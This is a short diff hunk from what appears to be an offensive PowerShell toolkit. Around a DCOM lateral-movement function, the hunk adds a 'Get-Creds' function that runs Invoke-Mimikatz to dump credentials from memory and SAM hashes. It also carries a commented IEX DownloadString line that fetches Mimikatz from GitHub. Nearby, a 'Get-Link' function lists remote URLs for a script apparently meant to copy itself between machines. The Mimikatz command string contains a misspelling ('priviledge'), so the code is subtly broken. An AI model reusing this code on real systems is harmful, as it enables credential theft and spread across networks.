@@ -189,7 +189,11 @@ function Invoke-DCOM {
     
 
 }
-
+function Get-Creds { 
+#IEX (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")
+$mem = Invoke-Mimikatz
+$reg = Invoke-Mimikatz -Command "priviledge::debug , token::elevate , lsadump::sam"
+}
 function Get-Link {
 $links = "https://raw.githubusercontent.com/D3F4LT99/P0w3rsh3ll3d/master/CopyMeIWantToTravel.ps1"
 $links &= "https://raw.githubusercontent.com/D3F4LT99/d3f4lt99.github.io/master/CopyMeIWantToTravel.ps1"
